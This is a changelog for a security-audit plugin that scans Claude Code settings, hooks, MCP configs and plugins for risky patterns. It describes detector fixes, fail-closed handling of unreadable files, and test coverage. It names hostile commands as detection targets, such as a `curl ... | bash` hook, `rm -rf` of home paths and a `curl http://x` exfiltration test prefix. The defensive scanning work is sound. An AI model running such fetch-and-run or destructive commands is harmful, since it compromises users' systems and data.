- `tests/test-uid-long-text-callers.sh` (new): every moved caller except PERM-001 (whose excerpt is the fixed string `Bash(*)`, `Read(*)` or `Write(*)`, so no long one exists), 17 rules and PROVENANCE-002, each on two inputs that differ in one character after character 200 or in a long name or key (the first five were red on 0.4.2); HOOK-004 pinned the other way (an edit past character 200 keeps the uid, equal to the 0.4.2 value); three short-excerpt uids pinned to 0.4.2 values; the set of files that still call `csa_finding_uid` pinned, and no raw-uid call may take `$preview`.
- `tests/test-report-render.sh`: a project with a plugin fixture finding, a scratch finding and a real one (chat lists the real one and prints the count line with the right counts; headline and table equal the same findings outside the group; the count line's total equals its buckets, with an `other` bucket for a missing or unknown severity; the markdown lists all three at full severity with two tagged); controls for the project's own `tests/`, a plugin file outside `fixtures/` and `tests/`, a file named `tests`, a nested or foreign `.dagr/scratch`, an empty group, a suppressed group finding, `--verbose`, an Info-only group, a relative scratch path and a missing `csa_normalize_path`.
- `tests/test-rules-secrets.sh`: SECRETS-004 skips for hex and path shapes, beside the AWS key, a hex run on a credential line (each keyword, and a commit OID line without one), multi-capital segments, a `+`/`=` blob, a long blob, a one-slash run, a path then a blob, a SHA then the AWS key, and an `awk` that fails. `tests/test-dispatcher-rule-engine.sh` runs SECRETS-004 and the group line through `bin/csa` (`set -euo pipefail`).
- `tests/test-fail-closed-readers.sh`: the 0.4.2 r3 C7 half-match pin, HOOK-004 with a `curl http://x` prefix and a read error, rc 2.
- Mutation-checked, each with the control beside it; the mutations that first survived (`[A-Z]?` to `[A-Z]*`, the project-root anchor, a caller passing `$preview`, 14 callers with no behaviour pin) now have a control and are killed. Still surviving: the `break` after a kept run, and `sub(/^[0-9]+:/` in SECRETS-004's filter, both equivalent (same output).

## 0.4.2 (2026-11-05)

The rest of #1089, from #1088's review, and the same failure in the MCP rules and the other grep rules. A reader that could not read used to report no finding; the readers below now report one. The checks can only add a stop: a real non-match, and a readable file with nothing in it, still report nothing, and a match a rule already found is never dropped.

### Fixed
- **A file the scan cannot read is a finding, once.** A target the audit could not read (`chmod 000`) was skipped silently by the rules that read it. The engine now emits one SCANNER-003 (Medium) per such target, when a rule in the scan's focus would have read it, and it does not count toward the "rule(s) failed" banner. The rules still skip the file themselves; an enabled plugin's unreadable `hooks/hooks.json` is still reported as HOOK-005. Run as root, where every file reads, none is reported.
- **A malformed `settings.json` no longer reads clean.** A settings file that is not valid JSON was a non-match in PERM-001 to PERM-004 and the schema check (PERM-005); it is now rc 2, a SCANNER-002 per rule: four, or five when a `settings.local.json` sits beside it (the divergence check on the local file also reports a malformed sibling `settings.json`). That alone trips the "rule(s) failed" banner. A top level that is valid JSON but has no keys (`42`, `"x"`, `true`) is rc 2 in PERM-005 too. A `permissions.deny` that has no length (a boolean) gives a SCANNER-002 from the two rules that read `deny`: PERM-002 always, and PERM-004 when `Bash(*)` is allowed. The project's own settings files also keep their HOOK-005.
- **A malformed `mcp.json` no longer reads clean.** MCP-002 (missing auth) and MCP-003 (env-var leak) read a jq failure as no servers. A jq failure is now a SCANNER-002 (rc 2) when the rule had found nothing before it; a server or secret it found before the failure is still emitted as a finding (rc 0), because the engine drops a rule's output on rc 2. A valid file with no `mcpServers` stays silent.
- **A marketplace entry that is not an object is a finding, and no longer hides the URLs after it.** `malformed-marketplace` read a jq failure on the entry check as no malformed entries; it now reports one. `untrusted-source` (MARKETPLACE-001) aborted its walk at such an entry and missed an http URL after it; it now skips the entry and checks the rest. The invalid-JSON and missing-array findings were already emitted and are pinned.
- **A jq error in HOOK-006 is rc 2, not a non-match.** An empty count is still rc 1.
- **A read error in the file rules is rc 2.** `grep` rc 2 or more was masked by `2>/dev/null | while` in the file mode of HOOK-001 to HOOK-003, the secrets rules, the CLAUDE.md rules, the prompt-injection rules and the MCP endpoint rule, and `cat` in HOOK-004 (network-exfiltration). `grep` rc 1 (no match) is unchanged. When the read fails after a match was found, the rule emits that match and returns 0, because the engine drops a rule's output on rc 2; when it found none, it stops with a SCANNER-002. HOOK-004 matches the content it read before a `cat` error and emits if both patterns match; otherwise a clean prefix is not a clean file, so it is a SCANNER-002.
- **A failed `mktemp` or hook-entry walk is a SCANNER-002, not a skip.** The walk was cached run-wide even when it failed, which silenced HOOK-001 to HOOK-005 for the file; a failed walk is no longer cached, and each hook rule that reads the file reports it. A failed walk's partial output is discarded, not scanned. A failure to write the coverage `.target` file costs the coverage line a count, not the walk. A failed `mktemp` for a rule's target list is a SCANNER-002 for that rule.
- **threat-model.md** says what a finding with no line (the bare file) and one with a `json_path` (`file#path`) print.

### Tests
- `tests/test-fail-closed-readers.sh`: each stop above beside a control (a real non-match, a valid file, a readable target), the SCANNER-002 counts for a malformed settings file, and a match kept through a read error. `tests/test-dispatcher-rule-engine.sh` runs a malformed `settings.json` and a `chmod 000` target through `bin/csa` (`set -euo pipefail`). The unreadable-target tests skip when run as root. Each pin was mutation-checked, with these exceptions that the sourced tests cannot observe: the `rm -f "$cf.target"` cleanup after a failed coverage-file write (the test's failing target is a directory, which `rm -f` cannot remove either way; it is kept, as it removes a half-written file), and the `continue` after a failed per-rule `mktemp` (a sourced run without errexit skips the rule anyway; under the dispatcher a failing `mktemp` earlier in the scan aborts it, as before).

## 0.4.1 (2026-11-05)

The P3 sweep from #1068's review (#1072). No new rule. Two failures that used to read as "nothing found" now say so: a jq error while one of the five rules that read hook entries (HOOK-001 to HOOK-005) reads an entry, and a failed HOOK-006 chat count. Other failures still read as no finding, among them HOOK-006's own rule and the permissions and marketplace rules on a jq failure, and a script the file-mode rules cannot read.

### Fixed
- **A jq error while one of the five rules reads a hook entry is no longer a non-match.** `csa_hook_entry_command` returned rc 1 for both "not a command" and a jq failure; HOOK-001 to HOOK-004 and HOOK-005 therefore counted an unreadable entry as checked. A jq failure is now rc 2, passed through by those rules, so the engine reports a SCANNER-002. When the engine can still name the entry (its own `json_path` read succeeds), the SCANNER-002 names it and the coverage line counts it `unreadable`; when that read fails too, the SCANNER-002 carries no `json_path` and the entry stays counted as `checked`. A real non-match stays rc 1.
- **A failed HOOK-006 count no longer reads as zero.** The chat summary printed nothing when its `jq` count failed (`|| echo 0`); it now prints `HOOK-006 count unavailable`.
- **A trailing slash on `CSA_PROJECT_ROOT` no longer moves finding ids.** `csa_normalize_path` compared the raw value, so `<p>/` changed every uid under the project and suppressions resurfaced. Under `<p>/`, a finding suppressed or saved under `<p>` now reads SUPPRESSED or PERSISTED there, where 0.4.0 read it NEW. It now strips every trailing slash before it compares (`/` stays `/`).
- **A finding with no line prints the bare file.** SCANNER-002, PROVENANCE-002 and the other line-0 findings printed `file:0` (chat) and `file:0:0` (report); they now print `file`.
- **Coverage:** `flagged` is documented, and pinned, as a subset of `checked`: an entry that one rule flags and another rule fails on is counted `unreadable`, so it is not `flagged` either; its finding still prints. A redundant `SCANNER-002` filter in the `flagged` definition is gone (no change in output).

### Tests
- `_hook_scan` (a checked scan, then the HOOK filter) replaces the roughly 28 `_scan | _hook_findings` pipes in `test-hook-entries.sh`, so a failed scan now fails the test instead of reading as no findings; a check that every `$(_scan_checked ...)` and `$(_hook_scan ...)` capture keeps its `|| return 1` (with a control line it must flag).
- Pins for branches that survived mutation: the HOOK-006 chat line's verbose guard, SUPPRESSED filter and plural wording; the `:0:0` check now runs on verbose chat, which is where Info prints; the file-scope SCANNER-002 carrying no `json_path` for a multi-entry file (`length == 1`, and an empty `json_path` key); the `$ok` base of the `flagged` count.
- Mutation-checked, each with an adjacent control: a jq error versus a real non-match (rc 2 versus rc 1) in each of the five rules and in the engine; a failing jq in the HOOK-006 count; `$_P`, `$_P/` and `$_P///` as project root; line 0 versus a real line in chat and report.

## 0.4.0

Renamed from `claude-security-audit` to `membrane`, in the marketplace's rename to `pulsestack`.
The commands are now `/membrane:security-audit` and its siblings, the install key is
`membrane@pulsestack`, and the session-start reminder and the report footer name `membrane`.
State files, the audit directory and the `# claude-security-audit` block the auto-fix writes into a
project's `.gitignore` keep their names, so an existing audit history, baseline and suppressions
carry over. To move: uninstall `claude-security-audit@claude-agent-scaffolding`, then install
`membrane@pulsestack` (the root README's *Renamed from claude-agent-scaffolding* section has every
step).

## 0.3.1 (2026-11-03)

Follow-ups to 0.3.0 (#1059). No new rule; one reading of the coverage line changes.

### Fixed
- **A trailing slash on the project root no longer skips settings hooks.** `csa rule_engine_scan_all "<p>/"` enumerated `<p>//.claude/settings.json`, which the exact-path test never matched, so the project's settings hooks were not read and nothing said so. The engine now strips trailing slashes from the root once. This holds for any root other than `/`; for `/` itself the settings hooks are still skipped, as before 0.3.1.
- **A failing `detect_text` is no longer counted as checked.** Its SCANNER-002 now names the entry's `json_path`, and the coverage line counts that entry under `unreadable`, not `checked`.
- **HOOK-006 prints `file#hooks`, not `file:0:0`,** and the chat summary, which hides Info, adds one line (`N file(s) declare hooks the audit does not inspect (HOOK-006, Info; pass --verbose)`) so an unchecked `http` or `prompt` hook is no longer invisible in chat.
- **HOOK-006's `finding_uid` hashes the per-type counts first,** as HOOK-005 does, so a long type name no longer hides a later change to the counts.
- **Wording:** the `finding_uid` is 32 bits, so two different hook commands share an id only by a 32-bit collision; 0.3.0's "never share an id" is corrected.

### Tests
- A real `\u` escape in the decoding tests, a `detect` versus `detect_text` verdict comparison on one command, a test that the json path is part of the entry digest, and a `_scan_checked` helper (the scan's status is captured before any pipe) used by the `&` and nested-settings controls and a few positive-result tests, with a test that makes its failed-scan and malformed-output arms run. (Corrected in 0.4.1: most positive-result tests and the roughly 25 older "0 findings" assertions still read the scan through a pipe and did not fail on a failed scan; 0.4.1 converts them.)

## 0.3.0 (2026-11-03)

**Hook commands declared in JSON are now audited (#427).** Before, a `curl ... | bash` in `.claude/settings.json`, or in an enabled plugin's `hooks/hooks.json`, gave zero findings: the hook rules read only scripts. Expect new findings, on first-party plugins too, the first time you audit after upgrading.

Skill-first question 3 (`docs/conventions/skill-first.md`): reading hook entries from JSON is mechanical work on open input (attacker-written command text), allowed as code because it can only add a stop and never approves anything. What it misses goes on to your own reading exactly as before. No model reads hook text.

### Added
- **`csa_hook_entries <file> <wrapped|plugin-manifest>`** (`lib/hook-entries.sh`) walks `.hooks.<Event>[i].hooks[j]` with `jq` and emits one JSON line per entry. `command` entries are decoded (JSON escapes; exec-form `args` joined into the checked text); other types are counted; each unreadable piece is an inconclusive line with its `json_path`. A `plugin.json` `hooks` field may be an inline event map, a path inside the plugin root (physical containment check; `./hooks/hooks.json` is a target already and is skipped) or an array of both.
- **Exact targets only:** the project's `.claude/settings.json` and `.claude/settings.local.json`, and a plugin's `hooks/hooks.json` and `.claude-plugin/plugin.json`. Never a nested `.claude/**/settings.json`, a plugin's `fixtures/` or `tests/` copy, or a plugin's root `settings.json`.
- **HOOK-001 to HOOK-004 read decoded commands** through a new `detect_text` entry point (one pattern per rule, shared with the file `detect`; HOOK-004 shares its two regexes). A match is a finding at line 0 with `context.json_path`; the `finding_uid` is built from 24 hex characters of the sha256 of the path and the full decoded command, short enough to pass `csa_redact` whole, so path and command length never hide a difference (the id itself is 32 bits, so two different commands share one only by a 32-bit collision), and reformatting the file changes nothing.
- **HOOK-005 `hook-entry-unreadable`** (High): a malformed file or a hook entry of the wrong shape is a finding, so a hook that went unread never reads as a clean audit.
- **HOOK-006 `hook-type-not-inspected`** (Info): one finding per file with per-type counts for `http`, `prompt`, `agent`, `mcp_tool` and later hook types.
- **A coverage line.** The engine prints `csa: hook-coverage checked=N flagged=N not-inspected=N unreadable=N` on stderr, the skill passes it to the report as `scope_summary`, and the report header prints it. `checked` counts every command entry matched against the HOOK patterns, and `flagged` those of them with a finding.
- Reports print `file#<json_path>` instead of `file:0:0` for a finding with a `context.json_path`.

### Known limits
- The patterns are the same common-pattern regexes as before; obfuscation still gets through. HOOK-002 (rm-rf) matches only `rm -rf` of an absolute path, so `rm -rf "$HOME"/x` is missed, in files and in hook entries alike; no pattern was widened.
- A handler script outside `.claude/hooks/` and the plugin directory is not read (the command that calls it is checked). `http`, `prompt` and `agent` hooks are counted, not inspected.
- User-level `~/.claude/settings.json` hooks are not read. Hooks in skill or agent frontmatter, inline hooks in a marketplace entry, managed-policy hooks, and Codex or OpenCode hook formats are not read.
- A plugin whose files do not normalize to `@plugin:<plugin>@<marketplace>:` (a `local/` plugin, an install record pointing outside the cache layout) has its JSON hooks unread.

## 0.2.0 (2026-11-02)

**Audits now scan your enabled plugins, so a first real run reports more.** On a real Claude Code install the scanner read no enabled plugin at all, and said nothing about it: a clean audit and a skipped one looked the same (#825). Expect new findings, on first-party plugins too, the first time you audit after upgrading.

### Fixed
- **`enabledPlugins` is read as Claude Code writes it.** It is an object map, `{"plugin@marketplace": true|false}`; the scanner only knew an array of names and read the object as empty. Only boolean values count, `false` means not enabled, and the array form still reads (each name as `true`). The user's `settings.json`, the project's, then the project's `settings.local.json` merge by key, the later file winning, so a project `false` disables a user `true`. A plugin's identity is the whole `plugin@marketplace` key. `settings.local.json` is a new read.
- **Each enabled plugin resolves to where it is installed.** The scanner looked for `cache/<plugin>/<version>`; Claude Code uses `cache/<marketplace>/<plugin>/<version>` and records every install in `~/.claude/plugins/installed_plugins.json`. The scanner now takes this project's `local` or `project` entry (its `projectPath` is the project root), else the `user` entry. An `installPath` is used only if it is a directory physically inside `~/.claude/plugins/`; one that points elsewhere (a `..`, a symlink out) is PROVENANCE-002. With no record entry it falls back to the cache layout, and a name part holding `/` or `..` is refused. An `installed_plugins.json` that exists but cannot be read or is not the shape this code knows stops the audit (rc 2), never an empty set.
- **PROVENANCE-002 is a finding.** An enabled plugin that does not resolve was a stderr line that a successful scan dropped. It is now a High finding that names the plugin and why, recorded in `state.json` and reported like any other, and a later audit that resolves it removes it from the report.
- **A plugin finding's id survives a version bump.** `FUID` paths for `cache/<marketplace>/<plugin>/<version>/...` now normalise to `@plugin:<plugin>@<marketplace>:...`; the older two-level form is unchanged. No stored id needs migrating: a real install never scanned a plugin, so no real finding used the old form.
- **Paranoid-mode candidates are plugins, not marketplaces.** They are the install record's keys plus each `cache/<marketplace>/<plugin>` as `plugin@marketplace`, minus the enabled set; a `false` plugin is a candidate. `temp_git_*` (a clone in progress) is skipped.
- **The SessionStart reminder's "enabled-plugin set changed" note is true.** `state.json` stored an empty snapshot whatever was enabled, and the hook read the object map's values (`true`, `false`) instead of names. The audit now records the enabled set and the hook compares the same set. After upgrading, each session's reminder may print a false "changed" note until the next audit rewrites the snapshot.

### Added
- **A loud warning for a shape the reader cannot use.** An `enabledPlugins` value that holds entries but yields none (a string, an array of non-strings, an object of non-booleans) prints `csa: warning: ... unrecognized shape (...)`, since Claude Code can change this format.

## 0.1.8 (2026-10-15)

### Fixed
- **A large enabled-plugin array no longer empties the enabled set** (#424). The project and user `enabledPlugins` arrays reached jq as one `--argjson` argv value each, so an array over the OS per-argument limit (131072 bytes on Linux) made jq print nothing, and every enabled plugin turned into a paranoid candidate. The lists now reach jq on stdin. A settings file that exists but cannot be read or is not a regular file (a FIFO would block jq forever), an unreadable plugin cache, or a failed merge now fails the enumeration with rc 2 and a message, never an empty set, and the scan's target list fails with it. Malformed JSON and an `enabledPlugins` value that is not an array still read as an empty list, as before; such a value no longer empties the other file's list as well.
- **Plugin cache names are compared whole** (#425). Paranoid candidates came from `find | xargs basename`, which split `my plugin` into `my` and `plugin`. Names are now read NUL-delimited and compared to the enabled set inside jq, so a name with a space or a newline is one identity. Candidates print one per line in codepoint order; a candidate whose name holds a newline cannot be one line, so the enumeration refuses it (rc 2) and prints nothing rather than split it.

## 0.1.7 (2026-10-15)

### Fixed
- **Focused scans no longer age other aspects' findings** (#429). Every audit advanced one global run index, so 11 `/secrets-scan` runs evicted a permissions or hook finding, and the next full audit labelled it NEW with a fresh `first_seen`. Each `audit_history` entry now records its `focus` (`all` for a full audit), and GC counts a finding's absence only in full runs and in runs focused on its aspect (its rule's directory). `csa state_record_audit` takes the focus as an optional fifth argument and refuses an unknown aspect before writing. A full audit ages findings exactly as before; runs recorded by 0.1.6 and earlier read as full runs, so an upgrade changes nothing until a focused run is recorded.

## 0.1.6 (2026-10-15)

### Fixed
- **Executable hook handlers with any suffix** (#426). The enumerator added extensionless executables under `.claude/hooks/` but skipped every dotted name, so an executable handler such as `preflight.tool` or a hidden `.guard` was never scanned. Every executable regular file there is now a target whatever its suffix; listed suffixes still come from the main pass, once. Non-executable files and symlinks stay out, as before.

## 0.1.5 (2026-10-13)

### Fixed
- **Secrets in TOML, YAML and JSONC configs** (#121). The target enumerator lists `.toml`, `.yaml`, `.yml` and `.jsonc` files (an OpenCode `settings.toml`, `~/.codex/config.toml`), but the `secrets` aspect gate dropped them before any detector ran, so a plaintext key there reported clean. The gate now passes all four.
- **Hook rules read OpenCode code outside `bin/`** (#127). The `hooks` aspect gate and the guard each hook rule repeats (HOOK-001 to HOOK-004) matched only `*.sh` and `.opencode/bin/*`, so `.opencode/lib/runtime.js` and `.opencode/plugin/*.ts` were never inspected. Both now pass `.js`, `.ts` and `.mjs` files under `.opencode/`.

## 0.1.4 (2026-09-04)

### Fixed
- **Public dispatcher delivery.** Both manifests now publish the dispatcher environment setup required for `csa rule_engine_scan_all` to discover rules without ambient `CSA_*` variables.
- **Hook handler safety rails.** The scanner covers executable extensionless handlers under `.claude/hooks/`, including plaintext-secret detection, while non-executable hook documents are skipped safely.
- **Pipefail false negatives.** Hook network-exfiltration, MCP literal-secret matching, and paranoid-plugin membership avoid producer-to-`grep -q` pipelines.

## 0.1.3 (2026-06-21)

CI hardening (#71) — keep the wall-clock perf benchmark out of blocking PR CI.

### Changed
- **`tests/test-perf.sh` honors `CSA_SKIP_PERF` (#71).** When the env var is set, the benchmark prints `skipped (CSA_SKIP_PERF set)` and exits 0 (a no-op pass — `run-tests.sh`'s glob still counts the file). The repo CI sets `CSA_SKIP_PERF=1` on the security-audit step because the 30s wall-clock hard-fail threshold is calibrated for the homelab reference machine and flakes on slower shared runners. Local / homelab runs are unaffected — the benchmark still runs there with no env var. No rule or audit-behavior changes; 182 tests otherwise unchanged.

## 0.1.2 (2026-05-26)

Shell-portability patch (v0.x.1 bundle). See `docs/HANDOFF-shell-portability-v0x1.md` in the marketplace repo.

### Fixed
- **Shell portability (zsh compatibility):** Claude Code's Bash tool runs zsh by default on macOS; skill bodies referenced libs as prose ("call `lib/state.sh::csa_state_bootstrap_gitignore`") which Claude would otherwise source under zsh, where `${BASH_SOURCE[0]}` is unset and lib self-location crashed. Added `bin/csa` dispatcher with `#!/usr/bin/env bash` shebang — kernel forces bash on direct execution regardless of caller shell. `auditing-claude-configs/SKILL.md` prose references rewritten to explicit `csa <fn-suffix>` dispatcher invocations across the audit/focus/apply-fix/suppress paths. `csa --list` enumerates dispatchable functions. The dispatcher is auto-discoverable via `$PATH` (Claude Code adds each plugin's `bin/` to PATH automatically). claude-security-audit had the highest BASH_SOURCE volume in the plugin lineup (50 sites across 11 lib files) but the simplest skill-body refactor (zero literal `source` statements; pure prose-reference rewrites) and zero BASH_REMATCH risk (1 site, non-critical).

## 0.1.1 (2026-05-25)

Manifest schema fix — v0.1.0 failed installation due to plugin.json shape mismatch against Claude Code's marketplace schema. Three fixes:
- `author` changed from string `"Praveen Kumar Singh"` to object `{"name": "Pras"}` (schema requires object form, matching sibling plugins ai-mentor/architect-critic)
- Removed explicit `skills` array — auto-discovered from `skills/*/SKILL.md` by convention
- Removed explicit `commands` array — auto-discovered from `commands/*.md` by convention
- Added top-level `category: "security"` for marketplace categorization

No code or rule changes. All 182 tests still pass.

## 0.1.0 (2026-05-25)

First public release. Static-analysis security audit for Claude Code project configs and enabled plugins, inspired by AgentShield in Everything Claude Code (Mustafa, 2026; MIT). 28 rules across 7 aspects, 182 tests, ≤30s perf budget for ~200-file workloads. Zero ambient surface by default — SessionStart reminder ships opt-in only (T1-C). Two-flag auto-fix gated by 5-layer defense-in-depth (T2-H). Durable `finding_uid` survives whitespace edits (T2-I). Self-tamper detection on state files (T1-F). 5 clean-fixture release gate (D17) verified at zero findings.

### Phase 0 — Eval fixtures
- Plugin manifest (no hooks declared per T1-C opt-in pattern)
- Bash test harness skeleton (`_helpers.sh`, `run-tests.sh`) with accumulator-style exit propagation
- `.gitignore` override re-including `.claude/` fixtures vs contributor global gitignore
- 5 clean-set fixture projects (release-gate metric per SPEC D17)
- 8 issue-set fixture projects covering all 7 v0.1 aspects + dedicated PERM-005 schema-typo
- 15 fixture existence tests (full detection assertions deferred to Phase 7 e2e)

### Phase 1 — Skill body + references
- SKILL.md for auditing-claude-configs with rich description for natural-language matching
- references/threat-model.md (distilled from SPEC §4 + §6.3 enumerate algorithm)
- references/severity-rubric.md (5-tier + chat posture + GC)
- references/auto-fix-policy.md (two-flag system + safe-write allowlist + tamper detection + gitignore bootstrap)

### Phase 2 — Foundation libs
- `lib/helpers.sh`: csa_sha256 (cross-platform), csa_realpath (with macOS fallback), csa_sed_inplace (GNU/BSD), csa_mkdir_lock (atomic)
- `lib/redact.sh`: pattern-aware redaction for Anthropic/OpenAI keys, JWT, GitHub PAT family, AWS keys, base64 blobs; configurable length cap
- `lib/fingerprint.sh`: two-layer per T2-I — `csa_finding_uid` (durable, no line number) + `csa_dedup_fingerprint` (per-run); plugin-version-stripping
- `lib/severity.sh`: 5-tier rank + compare + validate
- 35 unit tests added (cumulative 50)

### Phase 3 — Orchestration libs
- `lib/enumerate-targets.sh` per §6.3 pinned algorithm (T2-J); local-dev fallback for marketplace operator dogfood
- `lib/rule-engine.sh` with SCANNER-001/002 High-severity emit (T2-G); banner aggregation for 3+ SCANNER-002
- `lib/state.sh` schema_version=2; findings registry keyed on finding_uid (T2-I); GC after 10-run absence (T2-K); self_integrity tamper detection (T1-F); first-audit gitignore bootstrap (T1-D)
- `lib/baseline.sh` NEW/PERSISTED tagging via finding_uid
- `lib/suppress.sh` with race-window refusal + Critical-cannot-suppress
- `lib/report-render.sh` chat+markdown per §8.4 with stable display_id
- `lib/apply-fix.sh` two-flag system (T2-H) + 5-layer defense-in-depth (rule re-validation, target re-resolution, symlink refusal, path-traversal refusal, atomic state log)
- 54 unit tests added (cumulative ~104)

### Phase 4 — Rule files (7 aspects, 28 rules)
- secrets/ (4): SECRETS-001 to 004
- permissions/ (5): PERM-001 to 005 including dedicated schema validation per T1-E
- hooks/ (4): HOOK-001 to 004 (common-pattern only; AST is v0.2)
- mcp/ (3): MCP-001 to 003
- claude-md/ (2): CLAUDE-MD-001 to 002
- prompt-injection/ (2): PROMPT-INJ-001 to 002 (common-pattern only; semantic-intent is v0.2)
- marketplace/ (2): MARKETPLACE-001 to 002
- _known-keys.txt allowlist for PERM-005
- 51 rule tests added (cumulative ~151)
- All 5 clean fixtures produce zero findings (D17 release gate verified)

### Phase 5 — Slash command wrappers
- /security-audit, /secrets-scan, /permissions-review, /apply-fix — all use $ARGUMENTS (per feedback_slash_command_dollar_n_bug)
- Wrappers route to skill modes; no dedicated unit tests (covered by Phase 7 e2e)

### Phase 6 — Opt-in hook + README + LICENSE
- hooks/session-start-reminder.sh shipped as file (NOT declared in plugin.json — T1-C invariant)
- README.md with ECC attribution + scope-honesty caveats + opt-in registration snippet
- LICENSE (MIT)
- 2 hook smoke tests (153 cumulative)

### Phase 7 — E2E integration tests + perf benchmark
- 4 core e2e test files (audit, apply-fix, suppress, baseline) against all 13 fixtures
- 4 adversarial e2e test files covering T1-F (tamper), T2-G (rule-load), T2-H (malicious-rule), T2-I (uid-stability) per SPEC §14.4
- Perf benchmark validates ≤10s ideal / ≤30s fail-threshold for ~200-file workload (17s on Mac Mini M-series — passes threshold, WARN on ideal)
- Release-gate metric: ZERO findings on all 5 clean fixtures asserted in test-e2e-audit.sh
- Integration bugs found and fixed: (1) enumerate-targets.sh scanned .claude/audits/ — excluded via -not -path filter; (2) rule-engine ran N×M subshell cross-product — restructured to batch targets per rule (csa_rule_run_many) with aspect-based pre-filtering; (3) _next_scratch pattern using $() subshell lost counter increments — fixed to use global _CSA_SCRATCH without $()
- 29 e2e/perf tests added (cumulative 182)
